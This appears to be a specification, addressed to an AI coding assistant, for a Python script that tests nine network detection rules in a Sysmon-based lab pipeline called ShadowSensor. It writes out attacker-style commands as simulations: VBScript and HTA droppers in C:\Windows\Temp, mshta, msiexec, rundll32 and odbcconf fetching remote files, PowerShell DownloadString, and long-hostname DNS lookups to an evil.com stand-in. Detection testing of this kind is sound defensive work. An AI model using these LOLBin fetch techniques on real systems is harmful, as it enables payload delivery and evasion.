# Cursor Grok 4.5 — ShadowSensor Phase 7A Subphase 3 Simulation Script

## Purpose

Generate `scripts/simulate_subphase_3.py` — a simulation script that triggers all 9 Network
detection rules from `rules/definitions/network.yaml` and logs results to the ShadowSensor pipeline.

Live YAML audit confirmed **9 rules** (not 8 — the rule count in session context was off by one;
`NET_SCRIPT_ENGINE_OUTBOUND_001` is a live rule and must be covered).

---

## Hard Constraints (non-negotiable)

1. Output file: `scripts/simulate_subphase_3.py` only. No other files modified.
2. Frozen files — do not touch:
   - `rules/engine.py`, `rules/definitions/*.yaml`, `scripts/run_pipeline.py`,
     `storage/database.py`, `normalizer/*.py`, `ml/`, `api/`, `tests/`,
     `data/`, `docs/`, `status.md`, `handover.md`, `committee.md`,
     `rule_insights.md`, `task.md`, `VM_RUN_GUIDE.md`
3. Every rule and field value used in simulations comes from `rule_insights.md` and the
   confirmed network.yaml — no invented values.
4. If any value in this prompt conflicts with itself, STOP and report. Do not guess.
5. If `rule_insights.md` shows a gap for any rule, STOP and report before writing that section.

---

## FUNDAMENTAL DIFFERENCE FROM SUBPHASE 1 AND 2 — READ FIRST

**Subphases 1 and 2 were EID-1 (ProcessCreate) rules.** Those rules fire when a process is
created with a matching command-line. The process just needs to *launch* — it can fail, exit
immediately, or be refused by the network. Sysmon logs EID-1 at process creation.

**Subphase 3 rules are EID-3 (NetworkConnect) and EID-22 (DnsQuery).** These rules fire ONLY
when a process actually initiates a TCP connection (EID-3) or DNS query (EID-22). Simply
launching a process does not fire these rules. The process must be scripted to actually make
a network call.

**Consequence:** Every EID-3 and EID-22 simulation in this script uses a VBScript (.vbs),
HTA (.hta), or PowerShell one-liner that makes a real outbound TCP connection or DNS lookup.
These files are written to `C:\Windows\Temp\` in BLOCK 2 before any simulation runs.

---

## Critical Environment Notes (apply to every section)

### DB_PATH
```
DB_PATH = r"C:\ShadowSensor\data\shadowsensor.db"
```
This is HARDCODED. The live pipeline writes hits here. Do NOT compute it dynamically.

### REPO_ROOT and EXPORTS_DIR
```python
_REPO_ROOT = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
EXPORTS_DIR = os.path.join(_REPO_ROOT, "exports")
```

### Network target — NON-NEGOTIABLE
- Use `8.8.8.8` (port 80) and `8.8.4.4` (port 443) for ALL EID-3 simulation targets.
- Do NOT use `127.0.0.1` for EID-3 rules. Sysmon EID-3 is unreliable on loopback (D-g).
  127.0.0.1 is acceptable for EID-1 rules ONLY (those are in Subphase 1/2, not here).
- 8.8.8.8 does not serve HTTP on port 80 — connections will be refused or time out, but
  Sysmon captures EID-3 at TCP initiation, not at success. This is intentional.
- 8.8.4.4:443 is used for HTTPS paths to vary the destination IP across paths.

### WinHTTP vs WinINet — NON-NEGOTIABLE
- Use `WinHttp.WinHttpRequest.5.1` (WinHTTP) for all VBScript/HTA HTTP connections.
- Do NOT use `MSXML2.XMLHTTP`, `MSXML2.ServerXMLHTTP`, or any MSXML object.
  These go through COM/WinINet which does NOT generate Sysmon EID-3 events (D-b).
- WinHTTP is a separate, lower-level stack that does generate EID-3 events.

### D-b reminder (WinINet blind spot)
WinINet-based HTTP connections (used by Internet Explorer, legacy COM objects, some LOLBins
internally) generate NO Sysmon EID-3 or EID-22. If a process uses WinINet internally (not
WinHTTP), the rule will not fire regardless of the command line. Document as INCONCLUSIVE
where applicable — never as FAIL (which implies a rule defect).

### D28 — Two rules are structurally unfireable (SKIP, not FAIL)
- `NET_SUSPICIOUS_PORT_001` fires on ports 4444/1337/8888/etc. Sysmon EID-3 only captures
  ports 80/443 on this VM. Any outbound to non-80/443 ports is invisible to Sysmon.
- `NET_SMB_LATERAL_001` fires on ports 445/139. Same constraint — invisible to Sysmon.
- Both rules get explicit SKIP blocks. Add SKIP rows to results. Use `warn_zero`. No sys.exit.

### D29 — Script engine EID-3/EID-22 may produce zero events
Prior session confirmed a cscript.exe HTTPS round-trip to dns.google:443 (HTTP 200 returned)
produced ZERO Sysmon events of any type. Root cause not isolated. Applies to wscript.exe and
cscript.exe (and possibly mshta.exe). The following rules are D29-risk:
- `NET_DNS_SCRIPT_ENGINE_001` (EID-22 from wscript/cscript/mshta)
- `NET_SCRIPTING_ENGINE_HTTP_001` (EID-3 from wscript/cscript)
- `NET_SCRIPT_ENGINE_OUTBOUND_001` (EID-3 from wscript/cscript; mshta may differ)

Simulate all D29-risk rules anyway. Use `warn_zero` (not `sys.exit`). If 0 hits after
full poll: print `[D29] INCONCLUSIVE — script engine telemetry gap, not a rule defect`.
Do NOT mark as FAIL.

### cmd.exe structural limitation for NET_LOLBIN_PROCESS_HTTP_001
`cmd.exe` cannot natively initiate TCP connections — it has no socket API. It will never
appear as the image in EID-3 events for port 80/443. The rule's cmd.exe coverage is
legitimate for correlated attack chains in real incidents (cmd.exe as a downstream
child of a LOLBin that made the actual connection), but is NOT achievable as a direct
EID-3 simulation in this script. Substitute cmd.exe paths with msiexec.exe (also in
the rule's process list). Document substitution in CSV reason field.

### Co-firing note
Several rules share process images (mshta, wscript, cscript). A single simulation launch
may fire multiple rules simultaneously. This is correct — each rule_id has its own row in
`rule_hits`, and `hits_since` queries by rule_id. Keep each rule's simulation block
self-contained with its own `path_start` timestamp set immediately before its launches.

### Launch functions
All EID-3 rules use `launch_argv()` to spawn the target process. The spawned process
executes the VBScript/HTA/PowerShell that makes the actual TCP connection. Sysmon records
the spawned process as the `image` in the EID-3 event.

### Subprocess timeout
`launch_argv()` uses a 20-second subprocess timeout. For VBScript/HTA connections to
8.8.8.8:80 with WinHTTP timeouts set to 3000ms, the process exits well within 20 seconds.
For msiexec and rundll32, the 20-second timeout may trigger — that is expected and handled.

---

## BLOCK 0 — Imports and top-level constants

```python
import subprocess, datetime, time, sqlite3, csv, os, sys

_REPO_ROOT = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
EXPORTS_DIR = os.path.join(_REPO_ROOT, "exports")
DB_PATH = r"C:\ShadowSensor\data\shadowsensor.db"
os.makedirs(EXPORTS_DIR, exist_ok=True)

POWERSHELL = r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"
WSCRIPT    = r"C:\Windows\System32\wscript.exe"
CSCRIPT    = r"C:\Windows\System32\cscript.exe"
MSHTA      = r"C:\Windows\System32\mshta.exe"
RUNDLL32   = r"C:\Windows\System32\rundll32.exe"
MSIEXEC    = r"C:\Windows\System32\msiexec.exe"
NSLOOKUP   = r"C:\Windows\System32\nslookup.exe"

TEMP = r"C:\Windows\Temp"

print("=" * 60)
print("ShadowSensor Phase 7A — Subphase 3: Network Rule Simulation")
print("=" * 60)
print("PREREQUISITE: Confirm pipeline is running before this script.")
print(f"Script UTC start: {datetime.datetime.utcnow().isoformat()}")
print(f"Network targets: 8.8.8.8:80 (HTTP), 8.8.4.4:443 (HTTPS)")
print(f"Protocol: WinHTTP (EID-3 visible) — NOT WinINet (D-b blind)")
```

---

## BLOCK 1 — Helper functions

Implement these EXACTLY as written. Do not change polling durations or logic.

```python
def hits_since(rule_id: str, since: datetime.datetime, quick: bool = False) -> int:
    since_str = since.strftime("%Y-%m-%d %H:%M:%S")

    def _query() -> int:
        conn = sqlite3.connect(DB_PATH)
        n = conn.execute(
            "SELECT COUNT(*) FROM rule_hits WHERE rule_id=? AND timestamp>=?",
            (rule_id, since_str)
        ).fetchone()[0]
        conn.close()
        return n

    if quick:
        return _query()

    # Poll up to 180 seconds for first hit
    deadline = time.time() + 180
    elapsed = 0
    while time.time() < deadline:
        n = _query()
        if n > 0:
            print(f"  [DB] First hit after ~{elapsed}s — waiting 30s for second launch", flush=True)
            time.sleep(30)
            n = _query()
            print(f"  [DB] Final count: {n} hit(s)", flush=True)
            return n
        time.sleep(5)
        elapsed += 5

    return _query()


def launch_argv(argv: list, label: str) -> None:
    print(f"  [LAUNCH] {label}")
    print(f"  [CMD]    {' '.join(str(a) for a in argv)}")
    try:
        subprocess.run(argv, capture_output=True, timeout=20)
    except subprocess.TimeoutExpired:
        print(f"  [WARN] Process timed out — EID-3 captured at connection attempt")
    except (PermissionError, OSError) as e:
        print(f"  [WARN] Process blocked (WinError {getattr(e, 'winerror', '?')}) — may be PARTIAL")
    time.sleep(2)


def warn_zero(rule_id: str, path: str, reason: str = "") -> None:
    """Log warning on 0 hits — do NOT call sys.exit. Continue to next path."""
    msg = f"  [WARN] 0 hits for {rule_id} {path} after full poll window"
    if reason:
        msg += f" — {reason}"
    print(msg + " — continuing.")


results = []  # written to CSV at end
SIM_START = datetime.datetime.utcnow()
print(f"\nSimulation window start (UTC): {SIM_START.isoformat()}\n")
```

---

## BLOCK 2 — Pre-flight: write script files to disk

All EID-3 and EID-22 network simulations require script files written to disk before launching.
Write these files BEFORE the first simulation block. Use Python's built-in `open()` to write them.
If a write fails, print the error and continue — do NOT sys.exit.

### Files to write — exact content:

**`C:\Windows\Temp\ss_winhttp80.vbs`** — wscript/cscript HTTP to 8.8.8.8:80
```
On Error Resume Next
Dim h : Set h = CreateObject("WinHttp.WinHttpRequest.5.1")
h.Open "GET", "http://8.8.8.8/", False
h.SetTimeouts 3000, 3000, 3000, 3000
h.Send
WScript.Quit 0
```

**`C:\Windows\Temp\ss_winhttp443.vbs`** — wscript/cscript HTTPS to 8.8.4.4:443
```
On Error Resume Next
Dim h : Set h = CreateObject("WinHttp.WinHttpRequest.5.1")
h.Open "GET", "https://8.8.4.4/", False
h.SetTimeouts 3000, 3000, 3000, 3000
h.Send
WScript.Quit 0
```

**`C:\Windows\Temp\ss_mshta80.hta`** — mshta HTTP to 8.8.8.8:80
```
<html><head><script language="VBScript">
On Error Resume Next
Dim h : Set h = CreateObject("WinHttp.WinHttpRequest.5.1")
h.Open "GET", "http://8.8.8.8/", False
h.SetTimeouts 3000, 3000, 3000, 3000
h.Send
window.close()
</script></head><body></body></html>
```

**`C:\Windows\Temp\ss_mshta443.hta`** — mshta HTTPS to 8.8.4.4:443
```
<html><head><script language="VBScript">
On Error Resume Next
Dim h : Set h = CreateObject("WinHttp.WinHttpRequest.5.1")
h.Open "GET", "https://8.8.4.4/", False
h.SetTimeouts 3000, 3000, 3000, 3000
h.Send
window.close()
</script></head><body></body></html>
```

**`C:\Windows\Temp\ss_dns_long.vbs`** — wscript/cscript DNS tunnel attempt (long hostname, D29 risk)
```
On Error Resume Next
Dim h : Set h = CreateObject("WinHttp.WinHttpRequest.5.1")
h.Open "GET", "http://shadowsensor-a0a0a0a0a0a0a0a0a0a0a0a0a0a0a0a0a0a0a0a0a0a0a0.evil.com/", False
h.SetTimeouts 3000, 3000, 3000, 3000
h.Send
WScript.Quit 0
```
(hostname is 68 chars — satisfies `.{50,}` regex. Does NOT resolve — DNS NXDOMAIN expected.
EID-22 fires at the DNS query attempt, not on resolution success.)

**`C:\Windows\Temp\ss_dns_long_mshta.hta`** — mshta DNS tunnel attempt (D29 risk)
```
<html><head><script language="VBScript">
On Error Resume Next
Dim h : Set h = CreateObject("WinHttp.WinHttpRequest.5.1")
h.Open "GET", "http://shadowsensor-a0a0a0a0a0a0a0a0a0a0a0a0a0a0a0a0a0a0a0a0a0a0a0.evil.com/", False
h.SetTimeouts 3000, 3000, 3000, 3000
h.Send
window.close()
</script></head><body></body></html>
```

After writing all files, print a confirmation line for each file written or an error if any write failed.

---

## BLOCK 3 — Simulation rules

**Rule execution order (follow exactly):**
1. NET_POWERSHELL_HTTP_001
2. NET_DNS_LONG_QUERY_001
3. NET_DNS_SCRIPT_ENGINE_001
4. NET_SCRIPTING_ENGINE_HTTP_001
5. NET_SCRIPT_ENGINE_OUTBOUND_001
6. NET_LOLBIN_PROCESS_HTTP_001
7. NET_LOLBIN_NETWORK_001
8. NET_SUSPICIOUS_PORT_001 (SKIP block)
9. NET_SMB_LATERAL_001 (SKIP block)

---

### RULE 1: NET_POWERSHELL_HTTP_001 (EID-3)

Source: rule_insights.md NET_POWERSHELL_HTTP_001
Trigger: image ends_with "powershell.exe" AND initiated = "true" AND destination_port regex ^(80|443)$
         AND destination_hostname not_contains_any [MS exclusion list] (allow_null: true)
EID: 3 (NetworkConnect). Requires actual TCP connection.

3 attack paths. 2 launches per path.

Simulation mechanism: PowerShell `Invoke-WebRequest` to 8.8.8.8 — PS uses WinHTTP internally
(not WinINet) → generates EID-3. destination_hostname will be null (IP-direct, no DNS resolution)
→ allow_null fires the rule. Null hostname satisfies the not_contains_any exclusion regardless.

**Path A** — HTTPS to IP-direct (port 443, null hostname)
- Launch 1: `[POWERSHELL, "-Command", "try { Invoke-WebRequest -Uri 'https://8.8.4.4/' -TimeoutSec 5 -ErrorAction SilentlyContinue } catch { }"]`
- Launch 2: same command

**Path B** — HTTP to IP-direct (port 80, null hostname)
- Launch 1: `[POWERSHELL, "-Command", "try { Invoke-WebRequest -Uri 'http://8.8.8.8/' -TimeoutSec 5 -ErrorAction SilentlyContinue } catch { }"]`
- Launch 2: same command

**Path C** — HTTPS IP-direct via WebClient (alternate technique, still powershell.exe, port 443)
- Launch 1: `[POWERSHELL, "-Command", "try { (New-Object System.Net.WebClient).DownloadString('https://8.8.4.4/') } catch { }"]`
- Launch 2: same command

After BOTH launches per path:
- `n = hits_since("NET_POWERSHELL_HTTP_001", path_start)`
- If n == 0: `warn_zero("NET_POWERSHELL_HTTP_001", "Path X")`, result = "FAIL"
- If n >= 2: result = "PASS"
- Else: result = "PARTIAL"

**FP suppression test (only for this rule — has hostname exclusions):**
After all 3 paths complete, run:
```
fp_start = datetime.datetime.utcnow()
launch_argv([POWERSHELL, "-Command",
    "try { Invoke-WebRequest -Uri 'http://www.microsoft.com/' -TimeoutSec 5 -ErrorAction SilentlyContinue } catch { }"],
    "FP Test: PS → www.microsoft.com (excluded domain)")
time.sleep(5)
n_fp = hits_since("NET_POWERSHELL_HTTP_001", fp_start, quick=True)
if n_fp > 0:
    print(f"  [WARN] FP suppression FAILED — {n_fp} hit(s) for microsoft.com connection")
else:
    print(f"  [PASS] FP suppression OK — 0 hits for excluded hostname www.microsoft.com")
```
Include fp_result ("PASS"/"FAIL") in the results row for this rule.

---

### RULE 2: NET_DNS_LONG_QUERY_001 (EID-22)

Source: rule_insights.md NET_DNS_LONG_QUERY_001
Trigger: query_name regex ".{50,}" AND image not_ends_with_any [browser/SearchApp/msmpeng/svchost exclusion]
EID: 22 (DnsQuery). Requires actual DNS lookup.

3 attack paths. 2 launches per path.

Simulation mechanism: PowerShell's `[System.Net.Dns]::GetHostEntry()` and the system `nslookup.exe`
both use the Windows DNS resolver stack, which Sysmon's EID-22 hook intercepts. The domain does
NOT need to resolve — NXDOMAIN is sufficient; the query is still logged.

Target hostname: `"shadowsensor-a0a0a0a0a0a0a0a0a0a0a0a0a0a0a0a0a0a0a0a0a0a0a0.evil.com"`
(Total length: 68 chars — satisfies `.{50,}`)

**Path A** — powershell.exe via [System.Net.Dns]
- Launch 1: `[POWERSHELL, "-Command", "[System.Net.Dns]::GetHostEntry('shadowsensor-a0a0a0a0a0a0a0a0a0a0a0a0a0a0a0a0a0a0a0a0a0a0a0.evil.com') 2>$null"]`
  (Exception on NXDOMAIN is expected — swallow via try/catch or ErrorAction in the PS command)
  Better: wrap in try/catch:
  `[POWERSHELL, "-Command", "try { [System.Net.Dns]::GetHostEntry('shadowsensor-a0a0a0a0a0a0a0a0a0a0a0a0a0a0a0a0a0a0a0a0a0a0a0.evil.com') } catch { }"]`
- Launch 2: same command (image=powershell.exe is not in exclusion list → fires)

**Path B** — powershell.exe via Resolve-DnsName (alternate cmdlet, different internal path)
- Launch 1: `[POWERSHELL, "-Command", "Resolve-DnsName 'shadowsensor-a0a0a0a0a0a0a0a0a0a0a0a0a0a0a0a0a0a0a0a0a0a0a0.evil.com' -ErrorAction SilentlyContinue"]`
- Launch 2: same command

**Path C** — nslookup.exe (system DNS utility — image=nslookup.exe, not in exclusion list)
- Launch 1: `[NSLOOKUP, "shadowsensor-a0a0a0a0a0a0a0a0a0a0a0a0a0a0a0a0a0a0a0a0a0a0a0.evil.com"]`
- Launch 2: same command
- Note: rule_insights.md Path C describes a "custom binary" image — nslookup.exe is the closest
  system utility that reliably fires EID-22 and is not in the exclusion list. Document substitution.

After BOTH launches per path:
- `n = hits_since("NET_DNS_LONG_QUERY_001", path_start)`
- If n == 0: `warn_zero(...)`, result = "FAIL"
- If n >= 2: result = "PASS"
- Else: result = "PARTIAL"

---

### RULE 3: NET_DNS_SCRIPT_ENGINE_001 (EID-22, D29 risk)

Source: rule_insights.md NET_DNS_SCRIPT_ENGINE_001
Trigger: image ends_with_any "wscript.exe" | "cscript.exe" | "mshta.exe" (any DNS query)
EID: 22 (DnsQuery). Requires actual DNS lookup from the script engine process.

3 attack paths. 2 launches per path.

**D29 WARNING:** Prior session confirmed cscript.exe HTTPS to dns.google:443 (HTTP 200 received)
generated ZERO Sysmon events of any type. This rule may be INCONCLUSIVE for all paths.
Simulate anyway. If n == 0 after full poll: print `[D29] INCONCLUSIVE` — do NOT print FAIL.

Simulation mechanism: launch the VBScript/HTA files written in BLOCK 2 that contain the long
hostname URL. The WinHTTP call to a hostname triggers a DNS lookup, which Sysmon EID-22 should
capture — IF Sysmon hooks the DNS call path used by WinHTTP in this process context. D29 risk
is that WinHTTP inside wscript/cscript may bypass the Sysmon hook.

**Path A** — wscript.exe DNS (68-char hostname via WinHTTP connection attempt)
- Launch 1: `[WSCRIPT, "//nologo", r"C:\Windows\Temp\ss_dns_long.vbs"]`
- Launch 2: same command (image=wscript.exe → rule fires on EID-22 if Sysmon captures it)

**Path B** — cscript.exe DNS
- Launch 1: `[CSCRIPT, "//nologo", r"C:\Windows\Temp\ss_dns_long.vbs"]`
- Launch 2: same command (image=cscript.exe → rule fires on EID-22 if Sysmon captures it)

**Path C** — mshta.exe DNS
- Launch 1: `[MSHTA, r"C:\Windows\Temp\ss_dns_long_mshta.hta"]`
- Launch 2: same command (image=mshta.exe → rule fires on EID-22 if Sysmon captures it)

After BOTH launches per path:
```python
n = hits_since("NET_DNS_SCRIPT_ENGINE_001", path_start)
if n == 0:
    print(f"  [D29] INCONCLUSIVE — 0 hits for NET_DNS_SCRIPT_ENGINE_001 {path}. "
          f"Script engine telemetry gap — not a rule defect.")
    result = "INCONCLUSIVE"
elif n >= 2:
    result = "PASS"
else:
    result = "PARTIAL"
```
Do NOT call `warn_zero` for this rule — use the `[D29] INCONCLUSIVE` print instead.

---

### RULE 4: NET_SCRIPTING_ENGINE_HTTP_001 (EID-3, D29 risk)

Source: rule_insights.md NET_SCRIPTING_ENGINE_HTTP_001
Trigger: image ends_with_any "wscript.exe" | "cscript.exe" AND initiated = "true"
         AND destination_port regex ^(80|443)$
EID: 3 (NetworkConnect). No hostname exclusions. No FP suppression test.

**D29 WARNING:** Same risk as RULE 3. If n == 0: print `[D29] INCONCLUSIVE`, result = "INCONCLUSIVE".

3 attack paths. 2 launches per path.

**Path A** — wscript.exe HTTPS to 8.8.4.4:443
- Launch 1: `[WSCRIPT, "//nologo", r"C:\Windows\Temp\ss_winhttp443.vbs"]`
- Launch 2: same command

**Path B** — cscript.exe HTTP to 8.8.8.8:80
- Launch 1: `[CSCRIPT, "//nologo", r"C:\Windows\Temp\ss_winhttp80.vbs"]`
- Launch 2: same command

**Path C** — wscript.exe HTTP to 8.8.8.8:80
- Launch 1: `[WSCRIPT, "//nologo", r"C:\Windows\Temp\ss_winhttp80.vbs"]`
- Launch 2: same command

After BOTH launches per path:
```python
n = hits_since("NET_SCRIPTING_ENGINE_HTTP_001", path_start)
if n == 0:
    print(f"  [D29] INCONCLUSIVE — 0 hits for NET_SCRIPTING_ENGINE_HTTP_001 {path}.")
    result = "INCONCLUSIVE"
elif n >= 2:
    result = "PASS"
else:
    result = "PARTIAL"
```

---

### RULE 5: NET_SCRIPT_ENGINE_OUTBOUND_001 (EID-3, partial D29 risk)

Source: rule_insights.md NET_SCRIPT_ENGINE_OUTBOUND_001
Trigger: image ends_with_any "\wscript.exe" | "\cscript.exe" | "\mshta.exe" AND initiated = "true"
         (any destination port — but Sysmon only captures 80/443 via D28, so use 80/443)
EID: 3 (NetworkConnect). No exclusions. No FP suppression test.

**D29 WARNING for wscript/cscript paths.** mshta.exe may behave differently — attempt all three.
If n == 0 for wscript/cscript paths: `[D29] INCONCLUSIVE`.
If n == 0 for mshta path: `warn_zero(...)`, result = "FAIL" (mshta is not confirmed D29-affected).

3 attack paths. 2 launches per path.

**Path A** — wscript.exe HTTP to 8.8.8.8:80 (D29 risk)
- Launch 1: `[WSCRIPT, "//nologo", r"C:\Windows\Temp\ss_winhttp80.vbs"]`
- Launch 2: same command
- If n == 0: print `[D29] INCONCLUSIVE`, result = "INCONCLUSIVE"

**Path B** — cscript.exe HTTP to 8.8.8.8:80 (D29 risk)
- Launch 1: `[CSCRIPT, "//nologo", r"C:\Windows\Temp\ss_winhttp80.vbs"]`
- Launch 2: same command
- If n == 0: print `[D29] INCONCLUSIVE`, result = "INCONCLUSIVE"

**Path C** — mshta.exe HTTP to 8.8.8.8:80 (via HTA file — mshta is NOT confirmed D29-affected)
- Launch 1: `[MSHTA, r"C:\Windows\Temp\ss_mshta80.hta"]`
- Launch 2: same command
- If n == 0: call `warn_zero(...)`, result = "FAIL"
- If n >= 2: result = "PASS"
- Else: result = "PARTIAL"

---

### RULE 6: NET_LOLBIN_PROCESS_HTTP_001 (EID-3)

Source: rule_insights.md NET_LOLBIN_PROCESS_HTTP_001
Trigger: image ends_with_any "cmd.exe" | "mshta.exe" | "rundll32.exe" | "regsvr32.exe" | "msiexec.exe"
         AND initiated = "true" AND destination_port regex ^(80|443)$
EID: 3 (NetworkConnect). No exclusions. No FP suppression test.

3 attack paths. 2 launches per path.

**cmd.exe structural note:** cmd.exe cannot natively initiate TCP connections and will not appear
as the image in EID-3 events for port 80/443. All three paths use other processes from the rule's
image list. Document substitution in CSV reason field.

**Path A** — mshta.exe HTTPS to 8.8.4.4:443 (via HTA file)
- Launch 1: `[MSHTA, r"C:\Windows\Temp\ss_mshta443.hta"]`
- Launch 2: `[MSHTA, r"C:\Windows\Temp\ss_mshta443.hta"]`
- Expected: PASS. mshta WinHTTP → EID-3 with destination_port=443.

**Path B** — msiexec.exe HTTP to 8.8.8.8:80 (remote MSI download attempt)
- Launch 1: `[MSIEXEC, "/i", "http://8.8.8.8/a.msi", "/qn"]`
- Launch 2: `[MSIEXEC, "/i", "http://8.8.8.8/a.msi", "/qn"]`
- Note: msiexec internally uses BITS/WinHTTP for MSI download — may generate EID-3.
  If WinINet (D-b), will be INCONCLUSIVE. If n == 0: print `[D-b] INCONCLUSIVE — msiexec WinINet
  internal path likely — not a rule defect`, result = "INCONCLUSIVE".
- Do NOT call warn_zero for this path.

**Path C** — rundll32.exe HTTP to 8.8.8.8:80 (DLL download attempt)
- Launch 1: `[RUNDLL32, "http://8.8.8.8/a.dll,Entry"]`
- Launch 2: `[RUNDLL32, "http://8.8.8.8/a.dll,Entry"]`
- Note: rundll32 http:// DLL download — NOT Defender-blocked (confirmed in Subphase 2 Path C).
  rundll32 may use WinINet internally for DLL download — D-b risk.
  If n == 0: print `[D-b] INCONCLUSIVE — rundll32 DLL fetch may use WinINet`, result = "INCONCLUSIVE".
- Do NOT call warn_zero for this path.

After BOTH launches per path:
```python
n = hits_since("NET_LOLBIN_PROCESS_HTTP_001", path_start)
# Path-specific handling as described above
```
For Path A: standard PASS/PARTIAL/FAIL logic with warn_zero.

---

### RULE 7: NET_LOLBIN_NETWORK_001 (EID-3)

Source: rule_insights.md NET_LOLBIN_NETWORK_001
Trigger: image ends_with_any "mshta.exe" | "regsvr32.exe" | "msiexec.exe" | "installutil.exe"
         | "cmstp.exe" | "odbcconf.exe" | "regasm.exe" | "regsvcs.exe"
         AND initiated = "true" (any port — but Sysmon captures 80/443 only via D28)
EID: 3 (NetworkConnect). No exclusions. No FP suppression test.

3 attack paths. 2 launches per path.

**Structural note:** installutil, regasm, regsvcs, cmstp, odbcconf have no native HTTP mechanisms.
Only mshta and msiexec reliably initiate TCP connections. Paths use the most reliable processes.
For Path C, odbcconf with `/f http://...` is attempted but D-b risk applies.

**Path A** — mshta.exe HTTP to 8.8.8.8:80 (HIGH CONFIDENCE)
- Launch 1: `[MSHTA, r"C:\Windows\Temp\ss_mshta80.hta"]`
- Launch 2: `[MSHTA, r"C:\Windows\Temp\ss_mshta80.hta"]`
- Expected: PASS.
- Standard PASS/PARTIAL/FAIL logic with warn_zero.

**Path B** — msiexec.exe HTTP to 8.8.8.8:80
- Launch 1: `[MSIEXEC, "/i", "http://8.8.8.8/b.msi", "/qn"]`
- Launch 2: `[MSIEXEC, "/i", "http://8.8.8.8/b.msi", "/qn"]`
- If n == 0: print `[D-b] INCONCLUSIVE — msiexec internal WinINet path`, result = "INCONCLUSIVE".
- Do NOT call warn_zero.

**Path C** — odbcconf.exe HTTP to 8.8.8.8:80 (D-b risk)
- Launch 1: `[r"C:\Windows\System32\odbcconf.exe", "/f", "http://8.8.8.8/a.rsp"]`
- Launch 2: `[r"C:\Windows\System32\odbcconf.exe", "/f", "http://8.8.8.8/a.rsp"]`
- If n == 0: print `[D-b] INCONCLUSIVE — odbcconf /f HTTP likely uses WinINet`, result = "INCONCLUSIVE".
- Do NOT call warn_zero.

---

### RULE 8: NET_SUSPICIOUS_PORT_001 (EID-3 — SKIP, D28)

Source: rule_insights.md NET_SUSPICIOUS_PORT_001
Trigger: initiated = "true" AND destination_port regex ^(4444|1337|8888|9999|31337|...)$
EID: 3 (NetworkConnect).

**D28 — STRUCTURAL SKIP:** Sysmon EID-3 on this VM only captures ports 80/443. Any outbound
connection to port 4444, 1337, 8888, etc. is invisible to Sysmon regardless of process or rule
quality. This rule is structurally unfireable in this environment.

```python
print("\n" + "=" * 60)
print("RULE: NET_SUSPICIOUS_PORT_001 — SKIP (D28)")
print("Reason: Sysmon EID-3 only captures ports 80/443 on this VM.")
print("        C2 ports (4444/1337/8888/etc.) are not observed.")
print("        Not a rule defect — environmental Sysmon config limitation.")
print("=" * 60)
for path in ["Path_A", "Path_B", "Path_C"]:
    results.append({
        "rule_id": "NET_SUSPICIOUS_PORT_001",
        "attack_path": path,
        "field_values_used": "initiated=true;destination_port=4444/1337/8888",
        "result": "SKIP",
        "reason": "D28: Sysmon EID-3 captures only ports 80/443 — structurally unfireable",
        "timestamp_utc": datetime.datetime.utcnow().isoformat(),
    })
```

---

### RULE 9: NET_SMB_LATERAL_001 (EID-3 — SKIP, D28)

Source: rule_insights.md NET_SMB_LATERAL_001
Trigger: initiated = "true" AND destination_port regex ^(445|139)$
         AND image not_contains_any [system/svchost/lsass/services/msmpeng/wmiprvse]
EID: 3 (NetworkConnect).

**D28 — STRUCTURAL SKIP:** Same constraint as NET_SUSPICIOUS_PORT_001. Ports 445 and 139
(SMB) are not captured by Sysmon EID-3 on this VM.

```python
print("\n" + "=" * 60)
print("RULE: NET_SMB_LATERAL_001 — SKIP (D28)")
print("Reason: Sysmon EID-3 only captures ports 80/443 on this VM.")
print("        SMB ports (445/139) are not observed.")
print("        Not a rule defect — environmental Sysmon config limitation.")
print("=" * 60)
for path in ["Path_A", "Path_B", "Path_C"]:
    results.append({
        "rule_id": "NET_SMB_LATERAL_001",
        "attack_path": path,
        "field_values_used": "initiated=true;destination_port=445/139",
        "result": "SKIP",
        "reason": "D28: Sysmon EID-3 captures only ports 80/443 — structurally unfireable",
        "timestamp_utc": datetime.datetime.utcnow().isoformat(),
    })
```

---

## BLOCK 4 — Simulation window end

```python
SIM_END = datetime.datetime.utcnow()
print(f"\nSimulation window end (UTC): {SIM_END.isoformat()}")
```

---

## BLOCK 5 — Summary table

Print a summary table in this format:

```
RULE                           | PATH_A      | PATH_B      | PATH_C      | OVERALL
NET_POWERSHELL_HTTP_001        | PASS        | PASS        | PASS        | PASS
NET_DNS_LONG_QUERY_001         | PASS        | PASS        | PASS        | PASS
NET_DNS_SCRIPT_ENGINE_001      | INCONCLUSIVE| INCONCLUSIVE| INCONCLUSIVE| INCONCLUSIVE
...
```

OVERALL computation:
- If all paths PASS → PASS
- If any path FAIL → FAIL
- If any path INCONCLUSIVE (and none FAIL) → INCONCLUSIVE
- If all paths SKIP → SKIP
- If any path PARTIAL (and none FAIL or INCONCLUSIVE) → PARTIAL

Print final count:
`N/9 rules PASS, M PARTIAL, P INCONCLUSIVE (D29/D-b), Q SKIP (D28), R FAIL`

Also print FP test result for NET_POWERSHELL_HTTP_001 separately.

---

## BLOCK 6 — CSV export

Write to `os.path.join(EXPORTS_DIR, "subphase_3_training.csv")`.

Columns (exact): `rule_id, attack_path, field_values_used, result, reason, timestamp_utc`

One row per path per rule (including SKIP rows). Same format as Subphases 1 and 2.

For INCONCLUSIVE rows: reason = "D29: script engine telemetry gap — not a rule defect"
For D-b INCONCLUSIVE rows: reason = "D-b: process uses WinINet internally — EID-3 not generated"
For SKIP rows: reason = "D28: Sysmon EID-3 captures only ports 80/443"

---

## BLOCK 7 — Feature extraction instructions (print only, do not execute)

```
======================================================
NEXT STEPS — run manually after reviewing output above
======================================================

STEP 1 — Query DB for confirmed UTC window of this subphase:
  <python> -c "
  import sqlite3; conn = sqlite3.connect(r'C:\ShadowSensor\data\shadowsensor.db');
  row = conn.execute(\"SELECT MIN(timestamp), MAX(timestamp) FROM rule_hits
    WHERE rule_id LIKE 'NET_%' AND timestamp >= '<paste SIM_START UTC here>'\").fetchone();
  print('Since:', row[0]); print('Until:', row[1]); conn.close()"

STEP 2 — Run feature extraction with DB-confirmed timestamps:
  <python> <repo_root>\scripts\run_feature_extraction.py
    --label 1
    --since "YYYY-MM-DD HH:MM:SS"
    --until "YYYY-MM-DD HH:MM:SS"
    --output <repo_root>\data\features\suspicious_network.csv

  Replace YYYY-MM-DD HH:MM:SS with MIN and MAX from STEP 1.
